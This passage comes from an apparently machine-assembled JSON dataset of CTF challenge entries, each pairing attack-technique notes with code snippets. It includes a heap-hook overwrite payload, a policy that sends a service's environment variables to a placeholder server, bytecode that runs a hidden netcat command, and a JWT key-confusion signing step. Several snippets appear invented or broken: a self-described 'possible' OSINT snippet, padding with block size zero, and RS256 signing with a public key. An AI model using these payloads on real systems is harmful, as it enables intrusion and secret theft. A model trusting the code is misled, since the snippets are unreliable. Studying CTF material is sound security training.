            "When exploiting heap vulnerabilities, especially in scenarios involving `calloc` allocations, an off-by-one error can be used to bypass the zeroing effect of `calloc` by setting the `IS_MMAPED` flag on a chunk. This is achieved by incrementing the size field of a free chunk, which can lead to information leakage if `calloc` does not zero out the chunk's data upon allocation due to the presence of the `IS_MMAPED` flag. This technique is invaluable when there's a need to leak addresses in challenges constrained by `calloc` usage for allocations. \n   - Example scenario: Using an off-by-one vulnerability to edit a chunk size field to set the `IS_MMAPED` flag for leaking libc addresses.",
            "Fastbin duplication attacks can be leveraged to execute arbitrary code when exploiting double-free vulnerabilities. By carefully managing the heap and using off-by-one bugs to manipulate the heap's metadata (such as bypassing double-free protections), attackers can insert an arbitrary address into the fastbin freelist. This approach allows for control over future allocations and enables overwriting sensitive locations like `__malloc_hook` with a one-gadget to gain execution control. It's crucial to ensure that size fields match and to calculate offsets meticulously to place and use fake chunks effectively.\n   - Example scenario: Creating a fake chunk near `__malloc_hook` and overwriting it with a one-gadget address to execute arbitrary code.\n   - Example payload for overwriting `__malloc_hook`: `create(3, p8(0) * 0x13 + p64(libc.address + one_gadget_address))`"
        ],
        "key": "```c\n // chunk offset to edit  \n printf(\"Please enter your testament content: \");  \n chunk_offset = readOption();  \n if (check < chunk_offset) {  \n   printMessage(\"Nope, impossible!\");  \n }  \n  \n chunk_ptr = (char *)(chunk + (ulong)chunk_offset);  \n  \n // increment byte at offset by 1  \n *chunk_ptr = *chunk_ptr + '\\x01';  \n```\n\n```c\nint readOption(void)  \n{  \n int idx;  \n  \n read(0,&optionBuf,5);  \n idx = atoi(&optionBuf);  //optionBuf is only 4 bytes  \n if (idx < 0) {  \n   idx = 0;  \n }  \n return idx;  \n}  \n```\n\n```c\n index = readOption();  // testament index to try and free  \n if (9 < index) {  \n   printMessage(\"Oops! not a valid index\");  \n }  \n __ptr = *(void **)(&testaments + (ulong)index * 8);  \n if (__ptr == NULL) {  \n   printMessage(\"Impossible! No testaments\");  \n }  \n switch(index) {  \n case 0:  \n   if (doubleFreeCheck0 == 0) {  \n     printMessage(\"Impossible to delete again this testament\");  \n   }  \n   else {  \n     free(__ptr);  \n     doubleFreeCheck0 = 0;  \n   }  \n   break;  \n case 1:  \n   if (doubleFreeCheck1 == 0) {  \n     printMessage(\"Impossible to delete again this testament\");  \n   }  \n   else {  \n     free(__ptr);  \n     doubleFreeCheck1 = 0;  \n   }  \n   break;  \n case 2:  \n   if (doubleFreeCheck2 == 0) {  \n     printMessage(\"Impossible to delete again this testament\");  \n   }  \n   else {  \n     free(__ptr);  \n     doubleFreeCheck2 = 0;\n\n     // <-- code for remaining indexes removed for brevity -->  \n```"
    },
    {
        "name": "online nonogram",
        "write_up": "dataset/raw/online nonogram.md",
        "type": "reverse",
        "competition": [
            "TokyoWesterns/2020",
            "https://ctftime.org/event/1086/tasks/"
        ],
        "score": 252,
        "max_score": 478,
        "difficulty": 0.5271966527196653,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in a binary that doesn't strictly verify the size of user input against the buffer's capacity, one can corrupt nearby memory structures. This approach is effective in scenarios where adjacent memory structures contain vital program or data pointers that can be manipulated for further exploitation. To leverage this, carefully craft the input payload so that it overflows the buffer and modifies the adjacent memory data in a manner that benefits the exploitation process.",
            "Understanding and manipulating the structure of heap memory, especially using the characteristics of C++ vectors, can be utilized for leaking memory addresses and subsequently for arbitrary memory write operations. This technique is particularly useful in scenarios involving a heap overflow or an out-of-bounds write where the program's logic allows manipulation of heap-allocated data structures like C++ vectors. For leaking addresses, create conditions where uninitialized or improperly managed memory reveals pointers or heap structure data. For arbitrary writes, corrupt data structure pointers (such as the `next` pointers in a tcache list) to redirect application execution to controlled data or execute arbitrary code.\n   - For leaking (simplified): `add_puzzle(\"A\"*256)` to overflow and leak data.\n   - For arbitrary write using tcache corruption: First free some chunks to populate the tcache. Then, manipulate a future allocation into the tcache linked list to point to the target address. Prepare the content to overwrite the target in subsequent allocations: `add_puzzle(\"name\", size, \"A\"*8)` where `\"A\"*8` is replaced with the address or command to write into the previously targeted location."
        ],
        "key": "```c++\nstruct Puzzle {  \n   int size;  \n   char* data;  \n   std::string title;  \n   bool solved;  \n};\n\nchar gbuf[0x200];  \nstd::vector<struct Puzzle*> vec_puzzle;\n\nvoid add_puzzle(void) {  \n auto title = basic_string();  \n std::cout << \"Title: \";  \n  \n if (!(std::cin >> title)) {  \n   std::cout << \"Size: \";  \n   size = read_int();  \n   if (size == 0) {  \n     std::cout << \"input error\" << std::endl;  \n     return;  \n   }\n\n   std::cout << \"Puzzle: \";  \n   read_cnt = read(0,gbuf,(size * size >> 3) + 1);  \n   if (read_cnt < 1) {  \n     std::cout << \"input error\" << std::endl;  \n     return;  \n   }  \n   auto title_copy = std::string(title);  \n   auto puzzle_mem = operator.new(0x38);  \n   Puzzle(puzzle_mem,&title_copy,size,gbuf);  \n   ~basic_string(&title_copy);  \n   push_back(vec_puzzle,&puzzle_this);  \n   std::cout << \"Success\" << std::endl;  \n }  \n else {  \n   clear(0x1091d0);  \n   ignore();  \n   this = operator<<<std--char_traits<char>>(cout,\"input error\");  \n   operator<<(this,endl<char,std--char_traits<char>>);  \n }  \n ~basic_string(&title);  \n if (local_20 != *(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "Opa Opa Opa Opa Hei",
        "write_up": "dataset/raw/Opa Opa Opa Opa Hei.md",
        "type": "This write-up describes a CTF challenge which falls under the category of \"forensics\". The challenge involves investigating and analyzing various components such as docker-compose services, source code, Open Policy Agent (OPA), and environment variables to uncover the hidden flag. The solution involves understanding and manipulating policies in OPA, utilizing functions like startsWith and substring, and crafting a script to systematically reveal each character of the flag. The challenge requires a forensic approach to piece together clues and decode the flag character by character.",
        "competition": [
            "BSidesTLV/2023",
            "https://ctftime.org/event/2008/tasks/"
        ],
        "score": 400,
        "max_score": 500,
        "difficulty": 0.8,
        "knowledge": [
            "Accessing environment variables in a security policy can be performed using built-in functions or methods specific to the policy language being used. This approach can be utilized in scenarios where sensitive information is passed or stored in environment variables of services such as OPA (Open Policy Agent). An effective strategy includes crafting policies that can evaluate to true based on the content of an environment variable, allowing for indirect data exfiltration. Sample policy for testing whether a string starts with a specific prefix:\n```\n{\n\t\"policy\": \"allow{startswith(opa.runtime().env[\\\"FLAG\\\"],\\\"BSidesTLV2023{\\\")==true}\"\n}\n```",
            "When dealing with restricted character sets in inputs, methods like substring comparison can be applied as a bypass technique to infer or leak information character by character. This is particularly useful in environments where direct access to certain characters might be restricted by input validation or filtering mechanisms, such as regular expressions limiting allowed characters. In CTF challenges, crafting input to policies or queries with functions like substring allows an attacker to iteratively determine the value of restricted or unknown data. Evaluating a policy with custom inputs to perform character-by-character flag extraction:\n```\n{\n   \"uuid\": \"uuid_here\",\n   \"input\": \"{\\\"input\\\":{\\\"index\\\":0, \\\"cand\\\":\\\"B\\\"}}\"\n}\n```\nThis approach involves supplying a character and its index as parameters to evaluate if the character at the given index matches, allowing for a flag or other secret values to be discovered incrementally."
        ],
        "key": "```rego\nallow {\n    request := {\n        \"url\": \"https://MY_SERVER\",\n        \"method\": \"POST\",\n        \"body\": opa.runtime().env,\n    }\n    response := http.send(request)\n}\n```\n\n```rego\n{\n    \"policy\": \"allow{startswith(opa.runtime().env[\\\"FLAG\\\"],\\\"BSidesTLV2023{\\\")==true}\"\n}\n```\n\n```rego\n{\n    \"policy\": \"a{substring(opa.runtime().env[\\\"FLAG\\\"],input.index,1)==input.cand}\"\n}\n```"
    },
    {
        "name": "opisthocomus-hoazin",
        "write_up": "dataset/raw/opisthocomus-hoazin.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 300,
        "max_score": 493,
        "difficulty": 0.6085192697768763,
        "knowledge": [
            "When encountering cryptography CTF challenges that involve simple obfuscation or encryption methods, a practical approach is to perform known plaintext attacks. For such challenges, if the beginning of the plaintext (like \"flag{\") is known, and its corresponding encrypted output is given, one can derive a key or decryption method. Specifically, if an encryption algorithm uses the entirety of the ASCII character set and applies a consistent operation across all characters (e.g., XOR with a fixed key and mod operation with a large number `n`), it's feasible to reverse-engineer this process by creating a lookup table or `key` mapping each character to its encrypted counterpart.",
            "In cryptography or reverse-engineering challenges, when the encrypted data is significantly large, automation through scripting can simplify the decryption process. By writing a script that reads the encrypted values from a file and then decodes the flag using a previously constructed lookup table, a tedious manual process is efficiently streamlined. The script should ideally index the encrypted values against their plaintext counterparts, allowing for quick retrieval and decryption of extensive ciphertexts without manual effort. This method relies on the assumption that a direct mapping exists and can be exploited, as demonstrated in the provided Python code snippet where each encrypted character is matched against its plaintext representation through indexing in arrays or lists."
        ],
        "key": "```python\ndef encrypt():  \n   p = getPrime(1024)  \n   q = getPrime(1024)  \n   e = 2**16+1  \n   n=p*q  \n   ct=[]  \n   i = 0  \n   for ch in keyText:  \n       ct.append((ord(ch)^e)%n)  \n       key[ch] = str(ct[i])  \n       i += 1\n```"
    },
    {
        "name": "Ordersystem",
        "write_up": "dataset/raw/Ordersystem.md",
        "type": "reverse",
        "competition": [
            "Hack.lu/2022",
            "https://ctftime.org/event/1727/tasks/"
        ],
        "score": 343,
        "max_score": 500,
        "difficulty": 0.686,
        "knowledge": [
            "When faced with restrictions on directly executing or uploading code due to encoding constraints, consider using a subset of instructions or data that are permissible within the constraints to indirectly achieve the desired outcome. Example scenario: needing to execute code in an environment where data is hex-encoded before execution, thus limiting the available instructions to those that can be represented by printable hex characters. Use instructions that are representable in hex and can indirectly call or execute the desired function.\n   - No specific payload example applicable as this is a strategy reliant on the context-specific opcode and hex character availability.",
            "For bypassing input filtering or restrictions that limit direct file or command execution, creatively utilize application-provided functions or methods in unintended ways to chain together actions that lead to arbitrary code execution. This may involve crafting payloads that when executed piece by piece, accomplish the goal of spawning a reverse shell or similar. In scenarios where direct execution paths are filtered or blocked, use application features (e.g., logging, storing, or plugin execution functions) to indirectly assemble and execute malicious payloads.\n   - Example payload strategy: Break down the malicious code into acceptable pieces, store each piece using the application's storage functionality, and use a feature like plugin execution to read, assemble, and execute these pieces indirectly."
        ],
        "key": "```python\ndef plugin_log(msg,filename='./log',raw=False):  \n   mode = 'ab' if raw else 'a'\n\n   with open(filename,mode) as logfile:  \n       logfile.write(msg)  \n```\n\n```python\nopen(full,'w').write(content.hex())\n```\n\n```python\ndef load_const(index=0x30):  \n   return bytes([opmap[\"LOAD_CONST\"], index])\n\ndef get_plugin_code(func_index, filename_index, content_index):  \n   return (  \n       # pos 7 on the stack is the plugin_log function  \n       load_const(func_index)  \n       # pos 4-6 are unused  \n       # pos 3 contains the \"raw\" argument (must be non-zero)  \n       + load_const() * 4  \n       # pos 2 contains the \"filename\"  \n       + load_const(filename_index)  \n       # pos 1 contains the \"msg\"  \n       + load_const(content_index)  \n       # now trigger the \"exception handler\"  \n       + bytes([[opmap[\"WITH_EXCEPT_START\"], 0x30])  \n   )  \n```\n\n```python\nexploit_asm = [  \n   # Get length of empty list to push 0 on the stack  \n   (\"BUILD_LIST\", 0),  \n   # Use NOP as arg to simplify compiler  \n   (\"GET_LEN\", 0x09),  \n   # Invoke print() to push None onto the stack  \n   (\"LOAD_NAME\", co_names.index(\"print\")),  \n   (\"CALL_FUNCTION\", 0),  \n   # Import os  \n   (\"IMPORT_NAME\", co_names.index(\"os\")),  \n   # Invoke os.system()  \n   (\"LOAD_METHOD\", co_names.index(\"system\")),  \n   # Decode first batch of nc command  \n   (\"LOAD_CONST\", nc_index),  \n   (\"LOAD_METHOD\", co_names.index(\"decode\")),  \n   (\"CALL_METHOD\", 0),  \n   # Decode second batch of nc command  \n   (\"LOAD_CONST\", nc_index + 1),  \n   (\"LOAD_METHOD\", co_names.index(\"decode\")),  \n   (\"CALL_METHOD\", 0),  \n   # Decode third batch of nc command  \n   (\"LOAD_CONST\", nc_index + 2),  \n   (\"LOAD_METHOD\", co_names.index(\"decode\")),  \n   (\"CALL_METHOD\", 0),  \n   # Concatenate the three strings  \n   (\"BUILD_STRING\", 3),  \n   # Finaly invoke the nc command  \n   (\"CALL_METHOD\", 1),  \n]  \n```"
    },
    {
        "name": "OSDev",
        "write_up": "dataset/raw/OSDev.md",
        "type": "crypto",
        "competition": [
            "KipodAfterFree/2020",
            "https://ctftime.org/event/1133/tasks/"
        ],
        "score": 490,
        "max_score": 500,
        "difficulty": 0.98,
        "knowledge": [
            "When analyzing binary files with potential custom encryption mechanisms, use virtualization software (e.g., QEMU) to execute the binary if it's designed to run on a specific hardware or software architecture. This allows for dynamic analysis and understanding of the binary's behavior in its intended environment.",
            "Custom encryption algorithms, especially those that resemble known algorithms with slight modifications, can be reversed by carefully analyzing and understanding the modifications made to the standard algorithm. In the case of a modified AES encryption:\n    - Identify the functions that deviate from the standard AES, focusing on substitution boxes (S-boxes) or mix columns transformations.\n    - Implement inverse functions for these custom operations to reverse the encryption process.\n    - Apply the reverse operations in the correct order, accounting for any custom key schedule or XOR operations used in the encryption process.\n\nExample code snippet to reverse a custom AES encryption:\n```python\n# Custom inverse ShiftRows operation\ndef ishiftRows(input):  \n   iSR = [0,13,10,7,4,1,14,11,8,5,2,15,12,9,6,3]  \n   return [input[iSR[i]] for i in range(16)]\n\n# Example usage of reversing custom AES operations\np = [ciphertext_byte ^ TXOR[160+i] for i in range(16)]  # Reverse initial round XOR\nfor rnd in reversed(range(10)):  \n   if rnd != 9:  \n       p = imixColumns(p)  # Custom inverse MixColumns if not last round\n   p = ishiftRows(p)  # Custom inverse ShiftRows\n   p = ifuckBytes(p)  # Custom inverse ByteSub operation\n   for i in range(16):  \n       p[i] ^= TXOR[16*rnd+i]  # Reverse round XOR with custom key schedule\nprint(\"Decrypted plaintext:\", \"\".join([chr(x) for x in p]))\n```"
        ],
        "key": "```c\ndef mult(a,b):  \n   x = 0  \n   while a > 0:  \n       if a & 1:  \n           x ^= b  \n       b *= 2  \n       a = a >> 1  \n       if (b >> 8) & 1:  \n           b = b ^ u  \n   return x\n\ndef inv(x):  \n   if x:  \n       for i in range(0x100):  \n           y = mult(i,x)  \n           if y == 1:  \n               return i  \n   return 0\n\ndef iwtf(x):  \n   global u  \n   u = 0x101  \n   a = mult(inv(0x1f)&0xff,x^0x63) & 0xff  \n   u = 0x11b  \n   return inv(a)\n\ndef ifuckBytes(input):  \n   for i in range(16):  \n       input[i] = iwtf( input[i] )  \n   return input\n\ndef imixColumns(input):  \n   for i in range(4):  \n       j = 4*i  \n       a,b,c,d = input[j],input[j+1],input[j+2],input[j+3]  \n       input[j] = mult(14,a) ^ mult(11,b) ^ mult(13,c) ^ mult(9,d)  \n       input[j+1] = mult(9,a) ^ mult(14,b) ^ mult(11,c) ^ mult(13,d)  \n       input[j+2] = mult(13,a) ^ mult(9,b) ^ mult(14,c) ^ mult(11,d)  \n       input[j+3] = mult(11,a) ^ mult(13,b) ^ mult(9,c) ^ mult(14,d)  \n   return input  \n  \ndef ishiftRows(input):  \n   iSR = [0,13,10,7,4,1,14,11,8,5,2,15,12,9,6,3]  \n   return [ input[iSR[i]] for i in range(16) ]  \n```"
    },
    {
        "name": "oShell",
        "write_up": "dataset/raw/oShell.md",
        "type": "The type of challenge in this write-up is a `pwn` challenge.",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 280,
        "max_score": 384,
        "difficulty": 0.7291666666666666,
        "knowledge": [
            "For shell escape challenges where direct shell access is restricted, leveraging the functionality of common Linux utilities like `htop` can provide valuable insights into running processes or scripts. Specifically, using `htop` to run `strace` on a particular process can reveal sensitive information such as passwords for elevated access. This approach gains utility in scenarios where the target process interacts with files containing secrets or passwords.  \n    - Example scenario: A restricted shell environment provides `htop` utility. Using `htop` to `strace` the process responsible for authentication (e.g., `enable` command processing) can reveal the password by showing file read operations (`open`, `read` system calls) associated with secret files.",
            "When faced with restrictions on file content manipulation, creative use of network utilities such as `tcpdump` can facilitate indirect, controlled file write capabilities. Specifically, capturing network traffic with `tcpdump` can be used to write data to files in locations that are otherwise inaccessible due to shell restrictions. This method is effective when you can control the network traffic (such as ICMP echo responses) and the target system parses configuration files leniently, allowing embedded commands to be executed.  \n    - Example payload: To leverage this, start with capturing packets directed to an arbitrary file path that the application will parse, e.g., `tcpdump -w /path/to/target/config/file -s 500 icmp`. Then, generate ICMP traffic with controlled payloads that include configuration syntax or commands that will be parsed and executed by the application using the modified file."
        ],
        "key": "```python\n# oShell.py\n\nimport os\n\ndef enable():\n    password = input(\"Password: \")\n    if password == \"this-is-secret-7ce3ff0e2c8fd2a7\":\n        print(\"(enabled) oshell~#\")\n        # Grant access to more commands\n    else:\n        print(\"Wrong password :(\")\n\ndef main():\n    while True:\n        command = input(\"oshell~$ \")\n        if command == \"enable\":\n            enable()\n        elif command == \"exit\":\n            break\n        else:\n            print(\"Command not found\")\n\nif __name__ == \"__main__\":\n    main()\n```"
    },
    {
        "name": "OSINT The Creator",
        "write_up": "dataset/raw/OSINT The Creator.md",
        "type": "This write-up describes an OSINT (Open Source Intelligence) challenge where the participants have to do research to find the flag on a Discord profile. Therefore, the type of this CTF challenge is **OSINT**.",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When solving OSINT challenges related to identifying individuals within a specific platform (like Discord), first directly search for the target's name (if provided) among the community members or administrators. If this direct approach does not yield results or the target might use a different username, use platform-specific search functions or explore related social networks to find similarities in nicknames or profiles.",
            "In scenarios where the target is found but the information is not immediately visible, inspect all accessible elements of their profile. This includes status messages, profile descriptions, and any multimedia content (such as images or spoilers) that might hide the flag or clues leading to it."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context of OSINT challenge\ndef get_discord_profile(user_id):\n    # Simulating a function that fetches a Discord profile\n    # Potential vulnerability: Lack of authentication and authorization checks\n    profiles = {\n        \"12345\": {\"name\": \"Thomas\", \"description\": \"uiuctf{@b0uT_m3_suppOrT5_maRkD0wN}\"},\n        # Other profiles...\n    }\n    return profiles.get(user_id, None)\n\n# Example usage\nuser_profile = get_discord_profile(\"12345\")\nif user_profile:\n    print(f\"Profile found: {user_profile['name']}, Description: {user_profile['description']}\")\nelse:\n    print(\"Profile not found.\")\n```\n"
    },
    {
        "name": "OSRS",
        "write_up": "dataset/raw/OSRS.md",
        "type": "pwn",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 50,
        "max_score": 100,
        "difficulty": 0.5,
        "knowledge": [
            "When facing a binary exploitation challenge with a buffer overflow vulnerability due to the use of `gets()`, it is crucial to determine the offset between the start of the buffer and the return address. This knowledge enables the construction of a payload that overwrites the return address with a desired value, such as the address of a function or a buffer. In scenarios where security mechanisms like PIE (Position Independent Executable) or NX (No eXecute bit) are not enabled, but ASLR (Address Space Layout Randomization) is enabled, a leak can be exploited to determine the base address of the buffer or function, facilitating the crafting of an effective exploit. Sample payload structure: `[shellcode][padding][pointer to shellcode or desired function]`",
            "If a program leaks an address as part of its output, this can be exploited under ASLR to calculate the base address of the buffer or a particular function within the process's memory space. This technique is especially valuable when the leaked address can be directly attributed to a buffer where arbitrary input is stored or a stack address, as it allows for precisely targeting the memory address with a shellcode or return-oriented programming (ROP) chain despite ASLR. This knowledge is applicable in crafting a two-stage exploit where the first stage involves triggering the address leak and parsing it to calculate the target address, followed by executing the main payload that leverages the calculated address for code execution or memory manipulation."
        ],
        "key": "```c\nint get_tree(void)  \n{  \n int iVar1;  \n char local_110 [256];  \n int local_10;  \n  \n puts(\"Enter a tree type: \");  \n gets(local_110);  \n local_10 = 0;  \n while( true ) {  \n   if (0xc < local_10) {  \n     printf(\"I don\\'t have the tree %d :(\\n\",local_110);  \n     return 0xffffffff;  \n   }  \n   iVar1 = strcasecmp(*(char **)(trees + local_10 * 8),local_110);  \n   if (iVar1 == 0) break;  \n   local_10 = local_10 + 1;  \n }  \n return local_10;  \n}  \n```"
    },
    {
        "name": "OTP1",
        "write_up": "dataset/raw/OTP1.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 284,
        "max_score": 500,
        "difficulty": 0.568,
        "knowledge": [
            "When attacking XOR cipher challenges where the flag is used as a repeated key, tools like xortool can be invaluable for determining the key length. This is especially beneficial for ciphers with longer key sizes, as knowing the length can significantly reduce the complexity of breaking the cipher. A common strategy involves analyzing the ciphertext with xortool to identify probable key lengths, focusing on the highest percentages provided by the tool.",
            "In situations where the key length is known or guessed (such as when xortool indicates a probable length), using xortool with the `-l` option to specify the key length and `-c` to provide a guess for the most common character in the plaintext can reveal possible keys or parts of the plaintext. This method relies on statistical analysis and the frequency of characters in the expected plaintext, which, in CTF challenges, often involves known plaintext attacks where the format of the flag is predictable."
        ],
        "key": "```php\n<?php\nfunction pad_string($input, $blocksize) {\n    $pad = $blocksize - (strlen($input) % $blocksize);\n    return $input . str_repeat(chr($pad), $pad);\n}\n\n$flag = trim(file_get_contents(\"../../flag1.txt\"));\n$key = pad_string($flag, 0);\n\nfunction xor_encrypt($data, $key) {\n    $key = str_repeat($key, ceil(strlen($data) / strlen($key)));\n    return $data ^ $key;\n}\n\n$data = \"Sensitive data to encrypt\";\n$ciphertext = xor_encrypt($data, $key);\necho bin2hex($ciphertext);\n?>\n```"
    },
    {
        "name": "OTP2",
        "write_up": "dataset/raw/OTP2.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 422,
        "max_score": 500,
        "difficulty": 0.844,
        "knowledge": [
            "When dealing with encryption challenges where the flag is XORed and padded to a fixed length with random characters, one effective method to start decrypting is to focus on the known part of the plaintext. In this case, knowing the flag format (e.g., \"UDCTF{\") and that the plaintext consists of only uppercase characters provides a way to iteratively decrypt the ciphertext by aligning the known plaintext at different positions until decrypted content fits the expected pattern. This method relies on the fact that the ciphertext was produced by XORing the plaintext with a repeating key. Therefore, identifying the position where the known plaintext aligns correctly can lead to the recovery of parts of the plaintext.",
            "Once the position of the known plaintext within the ciphertext is identified, the next step to decrypting the flag is to sequentially guess the next character of the plaintext by XORing each possible character with the corresponding byte in the ciphertext. This brute-force approach is viable due to the limited character set (e.g., uppercase ASCII letters) and the predictable structure of the flag. By observing which results in valid plaintext (e.g., staying within the expected character set), one can iteratively decrypt the entire ciphertext. This method serves to crack XOR encryption when the key is repeated, and parts of the plaintext are known or can be guessed with high confidence.\n\nExample payload step for guessing the next character:\n```python\ndef possible_chars(key, kpos):\n   ch = ct[0][kpos]\n   res = []\n   for c in ascii_uppercase:\n       res.append(ch ^ ord(c))\n   return res\n\ndef find_nextchar(key, kpos):\n   pchars = possible_chars(key, kpos + len(key))\n   for c in pchars:\n       res = [try_kpos(x, kpos, key + bytes([c])) for x in ct]\n       if res[0][0] and res[1][0]:\n           print(chr(c), res[0][1], res[1][1])\n```\nThis snippet illustrates how to proceed once the alignment is found, by trying all uppercase ASCII characters for the next position, checking which ones result in valid plaintext according to the problem constraints (e.g., all-uppercase flags)."
        ],
        "key": "```php\n$flag = trim(file_get_contents(\"../../flag2.txt\"));  \n$key = pad_string($flag, 128);  \n```"
    },
    {
        "name": "OTP3",
        "write_up": "dataset/raw/OTP3.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "When dealing with an encryption scenario where a key is used to encrypt multiple plaintexts (i.e., a two-time pad situation), recovering the plaintext can be possible by finding the position at which plaintexts are padded and iterating through possible key lengths. This approach becomes feasible if the encryption mechanism pads the plaintext to a variable but known range of lengths before encryption. One can iterate through the range of possible key lengths to find consistent patterns or information, such as the position of the flag or known plaintext components.",
            "In a situation where you know the position of encrypted data (such as a flag) within a larger encrypted dataset and you have clues about the encryption methodology (e.g., the use of a two-time pad where the same key encrypts multiple plaintexts), a structured approach to sequentially recover each character of the encrypted data can be applied. This involves iteratively guessing the next character by considering all possible characters, decrypting them with all possible key parts, and then checking for consistency or recognizable patterns in the decrypted output. This method requires trial and error but can systematically uncover the correct sequence of characters constituting the hidden information or flag.\n   \nExample Python snippet for finding the next character in an encrypted message:\n```python\nklen = 549  # Assumed key length from analysis\nkpos = 245  # Known position of the start of the flag\n\ndef find_nextchar(key, kpos, klen):\n    # Assuming 'key' is the observed keystream or derived from ciphertexts,\n    # and 'cipher_text' is one of the ciphertexts.\n    # This function would attempt to decrypt part of the ciphertext\n    # with each possible byte value (0-255) to find a byte that\n    # results in a printable character or matches expected pattern.\n    for byte in range(256):\n        potential_char = decrypt_byte(cipher_text[kpos], key, byte)\n        if is_printable(potential_char):\n            print(f\"Potential character: {potential_char}\")\n```\n(Note: The actual decryption mechanism `decrypt_byte()` and check `is_printable()` would need to be defined based on the encryption scheme and context.)"
        ],
        "key": "```php\n$flag = trim(file_get_contents(\"../../flag3.txt\"));  \n$key = pad_string($flag, mt_rand(250,550));  \n```"
    },
    {
        "name": "OTS",
        "write_up": "dataset/raw/OTS.md",
        "type": "crypto",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": 105,
        "max_score": 500,
        "difficulty": 0.21,
        "knowledge": [
            "When dealing with cryptographic algorithms that allow manipulation of message content and its signature via hash functions, one can exploit the algorithm's logic by substituting bytes in the message and correspondingly adjusting the signature blocks using the hash function. In scenarios where signatures are calculated by applying a hash function a certain number of times based on the message content, changing a message byte from one value to another (specifically, to a lower value in terms of byte order) and then applying the hash function an appropriate number of additional times on the affected signature block, can maintain signature validity. This approach works under the condition that the cryptographic verification process hashes the adjusted signature block the correct total number of times to match the public key.",
            "When amending a message and its signature to include a specific word or set of bytes (e.g., \"flag\"), while ensuring the overall checksum of the message changes in a controlled manner, one can utilize a brute-force approach to modify unrelated parts of the message to decrease byte values until the new checksum has each byte smaller than the original checksum. This tactic relies on the flexibility to make arbitrary byte substitutions in parts of the message not critical to the desired outcome (like adding the word \"flag\"), followed by a systematic trial and error process to achieve an acceptable checksum that fits the required criteria and allows for corresponding adjustments to the signature. \n\nExample payload generation strategies include:\n- For substituting bytes and adjusting signature blocks: Calculate the difference in byte values between the original and desired message characters, then apply the hash function this many times to the corresponding signature block.\n- For modifying parts of the message to fit checksum constraints: Randomly decrease byte values in non-critical parts of the message, recalculate the checksum after each modification, and compare with the original checksum to ensure each byte of the new checksum is smaller, applying hash functions as needed to adjust the signature."
        ],
        "key": "```python\ndef is_ok(original_hash, new_hash):  \n   valid_ones = 0  \n   for a, b in zip(original_hash, new_hash):  \n       if a >= b:  \n           valid_ones += 1  \n   return valid_ones == 16  \n```"
    },
    {
        "name": "Our First API",
        "write_up": "dataset/raw/Our First API.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2019",
            "https://ctftime.org/event/898/tasks/"
        ],
        "score": 417,
        "max_score": 625,
        "difficulty": 0.6672,
        "knowledge": [
            "When dealing with JWT authentication in a challenge, if a public key is provided (usually found in hidden files like `robots.txt`), it suggests that a JWT key confusion attack may be possible. This involves changing the JWT header to use HS256 algorithm instead of RS256, tricking the server into validating a crafted JWT with a symmetric key derived from the public key. This can elevate privileges or bypass authentication if the payload is altered appropriately.  \n**Condition for use:** A public key is accessible and you can intercept or modify JWT tokens being sent to the server.  \n**Example payload alteration:** Changing `\"type\": \"user\"` to `\"type\": \"admin\"` in the JWT payload.",
            "To perform a JWT key confusion attack, after modifying the JWT header and payload, you need to create a signature using the public key as a symmetric key. This is achieved by using HMAC SHA256, with the public key as the secret. The signature is then appended to the crafted JWT part, completing the token which can then be used for authentication as an admin user.  \n**Condition for use:** JWT key confusion attack is applicable, and you have the necessary tools to modify and encode JWT tokens.  \n**Example signature generation:** Using OpenSSL:  \n```sh\nopenssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat signing.pem | xxd -p | tr -d \"\\\\n\")\n```  \nAnd then base64 URL encode the resulting signature to append to the JWT."
        ],
        "key": "```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt.exceptions import InvalidTokenError\n\napp = Flask(__name__)\n\n# Public key for verifying JWTs\nPUBLIC_KEY = open('signing.pem').read()\n\n@app.route('/auth', methods=['GET'])\ndef auth():\n    name = request.args.get('name')\n    if not name:\n        return jsonify({\"reason\": \"missing name parameter\"}), 400\n\n    # Create a JWT token\n    token = jwt.encode({\"name\": name, \"type\": \"user\"}, PUBLIC_KEY, algorithm=\"RS256\")\n    return jsonify({\"token\": token})\n\n@app.route('/api/normal', methods=['GET'])\ndef normal():\n    auth_header = request.headers.get('Authorization')\n    if not auth_header:\n        return jsonify({\"reason\": \"missing authorization header\"}), 403\n\n    try:\n        # Decode the JWT token\n        jwt.decode(auth_header, PUBLIC_KEY, algorithms=[\"RS256\"])\n        return jsonify({\"flag\": \"Congrats on authenticating! Too bad flags aren't for normal users !!\"})\n    except InvalidTokenError:\n        return jsonify({\"reason\": \"Invalid JWT or bad signature\"}), 403\n\n@app.route('/api/admin', methods=['GET'])\ndef admin():\n    auth_header = request.headers.get('Authorization')\n    if not auth_header:\n        return jsonify({\"reason\": \"missing authorization header\"}), 403\n\n    try:\n        # Decode the JWT token\n        payload = jwt.decode(auth_header, PUBLIC_KEY, algorithms=[\"RS256\"])\n        if payload.get(\"type\") == \"admin\":\n            return jsonify({\"flag\": \"RITSEC{JWT_th1s_0ne_d0wn}\"})\n        else:\n            return jsonify({\"reason\": \"Not an admin\"}), 403\n    except InvalidTokenError:\n        return jsonify({\"reason\": \"Invalid JWT or bad signature\"}), 403\n\nif __name__ == '__main__':\n    